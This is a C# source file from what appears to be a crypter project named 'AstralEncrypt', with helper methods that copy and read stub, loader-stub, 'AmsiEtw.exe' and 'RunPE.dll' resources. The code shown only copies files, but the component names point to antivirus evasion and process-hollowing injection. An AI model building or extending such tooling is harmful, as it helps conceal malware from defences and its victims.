using System;
using System.IO;

namespace AstralEncrypt.Fonction
{
    public class Deplacer
    {
        public static string CopyLireStub()
        {
            string resourcesPathStub = Environment.CurrentDirectory.Replace("\\bin\\Debug","") + "\\Ressources\\StubLoaderStub\\Stub.txt";
            string resourcesPathStubDestination = Environment.CurrentDirectory + "\\Stub.txt";
            if(File.Exists(resourcesPathStubDestination))
                File.Delete(resourcesPathStubDestination);
            File.Copy(resourcesPathStub,resourcesPathStubDestination,true);
            return File.ReadAllText(resourcesPathStubDestination);
        }
        public static string CopyLireLoaderStub()
        {
            string resourcesPathLoaderStub = Environment.CurrentDirectory.Replace("\\bin\\Debug","") + "\\Ressources\\StubLoaderStub\\LoaderStub.txt";
            string resourcesPathLoaderStubDestination = Environment.CurrentDirectory + "\\LoaderStub.txt";
            if(File.Exists(resourcesPathLoaderStubDestination))
                File.Delete(resourcesPathLoaderStubDestination);
            File.Copy(resourcesPathLoaderStub,resourcesPathLoaderStubDestination,true);
            return File.ReadAllText(resourcesPathLoaderStubDestination);
        }
        public static byte[] CopyLireAmsiEtw()
        {
            string resourcesPathAmsiEtw = Environment.CurrentDirectory.Replace("\\bin\\Debug","") + "\\Ressources\\Composant\\AmsiEtw.exe";
            string resourcesPathAmsiEtwDestination = Environment.CurrentDirectory + "\\AmsiEtw.exe";
            if(File.Exists(resourcesPathAmsiEtwDestination))
                File.Delete(resourcesPathAmsiEtwDestination);
            File.Copy(resourcesPathAmsiEtw,resourcesPathAmsiEtwDestination,true);
            return File.ReadAllBytes(resourcesPathAmsiEtwDestination);
        }
        public static byte[] CopyLireRunPE()
        {
            string resourcesPathRunPe = Environment.CurrentDirectory.Replace("\\bin\\Debug","") + "\\Ressources\\Composant\\RunPE.dll";
            string resourcesPathRunPeDestination = Environment.CurrentDirectory + "\\RunPE.dll";
            if(File.Exists(resourcesPathRunPeDestination))
                File.Delete(resourcesPathRunPeDestination);
            File.Copy(resourcesPathRunPe,resourcesPathRunPeDestination,true);
            return File.ReadAllBytes(resourcesPathRunPeDestination);
        }
    }
}